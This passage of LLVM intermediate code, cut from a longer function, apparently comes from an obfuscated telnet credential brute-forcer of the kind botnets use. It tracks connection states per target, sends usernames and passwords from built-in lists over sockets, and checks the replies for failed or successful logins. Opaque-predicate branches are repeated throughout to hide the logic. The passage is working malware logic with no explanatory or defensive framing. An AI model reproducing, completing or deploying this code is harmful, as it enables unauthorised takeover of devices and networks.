  %420 = load i32, i32* @y.84
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %418
  %427 = load i32, i32* %13, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %428
  call void @reset_telstate(%struct.telstate_t* %429)
  %430 = load i32, i32* @x.83
  %431 = load i32, i32* @y.84
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %442

; <label>:438:                                    ; preds = %originalBBpart274, %376
  %439 = load i32, i32* %13, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %440
  call void @advance_state(%struct.telstate_t* %441, i32 1)
  br label %442

; <label>:442:                                    ; preds = %438, %originalBBpart278
  br label %1298

; <label>:443:                                    ; preds = %188
  br label %444

; <label>:444:                                    ; preds = %443
  %445 = load i32, i32* @x.83
  %446 = load i32, i32* @y.84
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %444
  %453 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %20, i32 0, i32 0
  %454 = getelementptr inbounds [16 x i64], [16 x i64]* %453, i64 0, i64 0
  %455 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %454) #2, !srcloc !6
  %456 = extractvalue { i64, i64* } %455, 0
  %457 = extractvalue { i64, i64* } %455, 1
  %458 = trunc i64 %456 to i32
  store i32 %458, i32* %29, align 4
  %459 = ptrtoint i64* %457 to i64
  %460 = trunc i64 %459 to i32
  store i32 %460, i32* %30, align 4
  %461 = load i32, i32* @x.83
  %462 = load i32, i32* @y.84
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %469

; <label>:469:                                    ; preds = %originalBBpart282
  br label %470

; <label>:470:                                    ; preds = %469
  %471 = load i32, i32* %13, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 0
  %475 = load i32, i32* %474, align 16
  %476 = srem i32 %475, 64
  %477 = zext i32 %476 to i64
  %478 = shl i64 1, %477
  %479 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %20, i32 0, i32 0
  %480 = load i32, i32* %13, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 16
  %485 = sdiv i32 %484, 64
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds [16 x i64], [16 x i64]* %479, i64 0, i64 %486
  %488 = load i64, i64* %487, align 8
  %489 = or i64 %488, %478
  store i64 %489, i64* %487, align 8
  %490 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i64 0, i64* %490, align 8
  %491 = load i32, i32* %11, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 %492, i64* %493, align 8
  %494 = load i32, i32* %13, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 0
  %498 = load i32, i32* %497, align 16
  %499 = add nsw i32 %498, 1
  %500 = call i32 @select(i32 %499, %struct.__sigset_t* null, %struct.__sigset_t* %20, %struct.__sigset_t* null, %struct.timeval* %21)
  store i32 %500, i32* %14, align 4
  %501 = load i32, i32* %14, align 4
  %502 = icmp eq i32 %501, 1
  br i1 %502, label %503, label %551

; <label>:503:                                    ; preds = %470
  store i32 4, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %504 = load i32, i32* %13, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 0
  %508 = load i32, i32* %507, align 16
  %509 = bitcast i32* %23 to i8*
  %510 = call i32 @getsockopt(i32 %508, i32 1, i32 4, i8* %509, i32* %22) #2
  %511 = load i32, i32* %23, align 4
  %512 = icmp ne i32 %511, 0
  br i1 %512, label %513, label %517

; <label>:513:                                    ; preds = %503
  %514 = load i32, i32* %13, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %515
  call void @reset_telstate(%struct.telstate_t* %516)
  br label %534

; <label>:517:                                    ; preds = %503
  %518 = load i32, i32* %13, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 0
  %522 = load i32, i32* %521, align 16
  %523 = load i32, i32* %13, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = call i32 (i32, i32, ...) @fcntl(i32 %527, i32 3, i8* null)
  %529 = and i32 %528, -2049
  %530 = call i32 (i32, i32, ...) @fcntl(i32 %522, i32 4, i32 %529)
  %531 = load i32, i32* %13, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %532
  call void @advance_state(%struct.telstate_t* %533, i32 2)
  br label %534

; <label>:534:                                    ; preds = %517, %513
  %535 = load i32, i32* @x.83
  %536 = load i32, i32* @y.84
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %534
  %543 = load i32, i32* @x.83
  %544 = load i32, i32* @y.84
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %1315

; <label>:551:                                    ; preds = %470
  %552 = load i32, i32* %14, align 4
  %553 = icmp eq i32 %552, -1
  br i1 %553, label %554, label %574

; <label>:554:                                    ; preds = %551
  %555 = load i32, i32* @x.83
  %556 = load i32, i32* @y.84
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %554
  %563 = load i32, i32* %13, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %564
  call void @reset_telstate(%struct.telstate_t* %565)
  %566 = load i32, i32* @x.83
  %567 = load i32, i32* @y.84
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %1315

; <label>:574:                                    ; preds = %551
  br label %575

; <label>:575:                                    ; preds = %574
  %576 = load i32, i32* %13, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 7
  %580 = load i32, i32* %579, align 16
  %581 = add i32 %580, 5
  %582 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %583 = icmp ult i32 %581, %582
  br i1 %583, label %584, label %604

; <label>:584:                                    ; preds = %575
  %585 = load i32, i32* @x.83
  %586 = load i32, i32* @y.84
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %584
  %593 = load i32, i32* %13, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %594
  call void @reset_telstate(%struct.telstate_t* %595)
  %596 = load i32, i32* @x.83
  %597 = load i32, i32* @y.84
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %604

; <label>:604:                                    ; preds = %originalBBpart294, %575
  %605 = load i32, i32* @x.83
  %606 = load i32, i32* @y.84
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %604
  %613 = load i32, i32* @x.83
  %614 = load i32, i32* @y.84
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1298

; <label>:621:                                    ; preds = %188
  %622 = load i32, i32* %13, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 0
  %626 = load i32, i32* %625, align 16
  %627 = load i32, i32* %11, align 4
  %628 = load i32, i32* %13, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 9
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @read_until_response(i32 %626, i32 %627, i8* %632, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %634 = icmp ne i32 %633, 0
  br i1 %634, label %635, label %668

; <label>:635:                                    ; preds = %621
  %636 = load i32, i32* %13, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 9
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @contains_fail(i8* %640)
  %642 = icmp ne i32 %641, 0
  br i1 %642, label %643, label %647

; <label>:643:                                    ; preds = %635
  %644 = load i32, i32* %13, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %645
  call void @advance_state(%struct.telstate_t* %646, i32 0)
  br label %667

; <label>:647:                                    ; preds = %635
  %648 = load i32, i32* @x.83
  %649 = load i32, i32* @y.84
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %647
  %656 = load i32, i32* %13, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %657
  call void @advance_state(%struct.telstate_t* %658, i32 3)
  %659 = load i32, i32* @x.83
  %660 = load i32, i32* @y.84
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %667

; <label>:667:                                    ; preds = %originalBBpart2102, %643
  br label %1315

; <label>:668:                                    ; preds = %621
  %669 = load i32, i32* %13, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 7
  %673 = load i32, i32* %672, align 16
  %674 = add i32 %673, 7
  %675 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %676 = icmp ult i32 %674, %675
  br i1 %676, label %677, label %681

; <label>:677:                                    ; preds = %668
  %678 = load i32, i32* %13, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %679
  call void @reset_telstate(%struct.telstate_t* %680)
  br label %681

; <label>:681:                                    ; preds = %677, %668
  %682 = load i32, i32* @x.83
  %683 = load i32, i32* @y.84
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %681
  %690 = load i32, i32* @x.83
  %691 = load i32, i32* @y.84
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1298

; <label>:698:                                    ; preds = %188
  %699 = load i32, i32* @x.83
  %700 = load i32, i32* @y.84
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %698
  %707 = load i32, i32* %13, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 0
  %711 = load i32, i32* %710, align 16
  %712 = load i32, i32* %13, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 4
  %716 = load i8, i8* %715, align 2
  %717 = zext i8 %716 to i64
  %718 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %717
  %719 = load i8*, i8** %718, align 8
  %720 = load i32, i32* %13, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 4
  %724 = load i8, i8* %723, align 2
  %725 = zext i8 %724 to i64
  %726 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %725
  %727 = load i8*, i8** %726, align 8
  %728 = call i64 @strlen(i8* %727) #10
  %729 = call i64 @send(i32 %711, i8* %719, i64 %728, i32 16384)
  %730 = icmp slt i64 %729, 0
  %731 = load i32, i32* @x.83
  %732 = load i32, i32* @y.84
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %730, label %739, label %743

; <label>:739:                                    ; preds = %originalBBpart2110
  %740 = load i32, i32* %13, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %741
  call void @reset_telstate(%struct.telstate_t* %742)
  br label %1315

; <label>:743:                                    ; preds = %originalBBpart2110
  %744 = load i32, i32* @x.83
  %745 = load i32, i32* @y.84
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %743
  %752 = load i32, i32* %13, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 0
  %756 = load i32, i32* %755, align 16
  %757 = call i64 @send(i32 %756, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %758 = icmp slt i64 %757, 0
  %759 = load i32, i32* @x.83
  %760 = load i32, i32* @y.84
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %758, label %767, label %771

; <label>:767:                                    ; preds = %originalBBpart2114
  %768 = load i32, i32* %13, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %769
  call void @reset_telstate(%struct.telstate_t* %770)
  br label %1315

; <label>:771:                                    ; preds = %originalBBpart2114
  %772 = load i32, i32* %13, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %773
  call void @advance_state(%struct.telstate_t* %774, i32 4)
  br label %1298

; <label>:775:                                    ; preds = %188
  %776 = load i32, i32* %13, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 0
  %780 = load i32, i32* %779, align 16
  %781 = load i32, i32* %11, align 4
  %782 = load i32, i32* %13, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 9
  %786 = load i8*, i8** %785, align 8
  %787 = call i32 @read_until_response(i32 %780, i32 %781, i8* %786, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %788 = icmp ne i32 %787, 0
  br i1 %788, label %789, label %838

; <label>:789:                                    ; preds = %775
  %790 = load i32, i32* @x.83
  %791 = load i32, i32* @y.84
  %792 = sub i32 %790, 1
  %793 = mul i32 %790, %792
  %794 = urem i32 %793, 2
  %795 = icmp eq i32 %794, 0
  %796 = icmp slt i32 %791, 10
  %797 = or i1 %795, %796
  br i1 %797, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %789
  %798 = load i32, i32* %13, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 9
  %802 = load i8*, i8** %801, align 8
  %803 = call i32 @contains_fail(i8* %802)
  %804 = icmp ne i32 %803, 0
  %805 = load i32, i32* @x.83
  %806 = load i32, i32* @y.84
  %807 = sub i32 %805, 1
  %808 = mul i32 %805, %807
  %809 = urem i32 %808, 2
  %810 = icmp eq i32 %809, 0
  %811 = icmp slt i32 %806, 10
  %812 = or i1 %810, %811
  br i1 %812, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %804, label %813, label %817

; <label>:813:                                    ; preds = %originalBBpart2118
  %814 = load i32, i32* %13, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %815
  call void @advance_state(%struct.telstate_t* %816, i32 0)
  br label %821

; <label>:817:                                    ; preds = %originalBBpart2118
  %818 = load i32, i32* %13, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %819
  call void @advance_state(%struct.telstate_t* %820, i32 5)
  br label %821

; <label>:821:                                    ; preds = %817, %813
  %822 = load i32, i32* @x.83
  %823 = load i32, i32* @y.84
  %824 = sub i32 %822, 1
  %825 = mul i32 %822, %824
  %826 = urem i32 %825, 2
  %827 = icmp eq i32 %826, 0
  %828 = icmp slt i32 %823, 10
  %829 = or i1 %827, %828
  br i1 %829, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %821
  %830 = load i32, i32* @x.83
  %831 = load i32, i32* @y.84
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %1315

; <label>:838:                                    ; preds = %775
  %839 = load i32, i32* @x.83
  %840 = load i32, i32* @y.84
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %838
  %847 = load i32, i32* %13, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 7
  %851 = load i32, i32* %850, align 16
  %852 = add i32 %851, 3
  %853 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %854 = icmp ult i32 %852, %853
  %855 = load i32, i32* @x.83
  %856 = load i32, i32* @y.84
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBBpart2136, label %originalBB124alteredBB

originalBBpart2136:                               ; preds = %originalBB124
  br i1 %854, label %863, label %867

; <label>:863:                                    ; preds = %originalBBpart2136
  %864 = load i32, i32* %13, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %865
  call void @reset_telstate(%struct.telstate_t* %866)
  br label %867

; <label>:867:                                    ; preds = %863, %originalBBpart2136
  br label %1298

; <label>:868:                                    ; preds = %188
  %869 = load i32, i32* %13, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 0
  %873 = load i32, i32* %872, align 16
  %874 = load i32, i32* %13, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 5
  %878 = load i8, i8* %877, align 1
  %879 = zext i8 %878 to i64
  %880 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %879
  %881 = load i8*, i8** %880, align 8
  %882 = load i32, i32* %13, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 5
  %886 = load i8, i8* %885, align 1
  %887 = zext i8 %886 to i64
  %888 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %887
  %889 = load i8*, i8** %888, align 8
  %890 = call i64 @strlen(i8* %889) #10
  %891 = call i64 @send(i32 %873, i8* %881, i64 %890, i32 16384)
  %892 = icmp slt i64 %891, 0
  br i1 %892, label %893, label %897

; <label>:893:                                    ; preds = %868
  %894 = load i32, i32* %13, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %895
  call void @reset_telstate(%struct.telstate_t* %896)
  br label %1315

; <label>:897:                                    ; preds = %868
  %898 = load i32, i32* %13, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 0
  %902 = load i32, i32* %901, align 16
  %903 = call i64 @send(i32 %902, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %904 = icmp slt i64 %903, 0
  br i1 %904, label %905, label %909

; <label>:905:                                    ; preds = %897
  %906 = load i32, i32* %13, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %907
  call void @reset_telstate(%struct.telstate_t* %908)
  br label %1315

; <label>:909:                                    ; preds = %897
  %910 = load i32, i32* @x.83
  %911 = load i32, i32* @y.84
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %909
  %918 = load i32, i32* %13, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %919
  call void @advance_state(%struct.telstate_t* %920, i32 6)
  %921 = load i32, i32* @x.83
  %922 = load i32, i32* @y.84
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1298

; <label>:929:                                    ; preds = %188
  %930 = load i32, i32* %13, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 0
  %934 = load i32, i32* %933, align 16
  %935 = load i32, i32* %11, align 4
  %936 = load i32, i32* %13, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 9
  %940 = load i8*, i8** %939, align 8
  %941 = call i32 @read_until_response(i32 %934, i32 %935, i8* %940, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %942 = icmp ne i32 %941, 0
  br i1 %942, label %943, label %1061

; <label>:943:                                    ; preds = %929
  %944 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %945 = load i32, i32* %13, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 7
  store i32 %944, i32* %948, align 16
  %949 = load i32, i32* %13, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %950
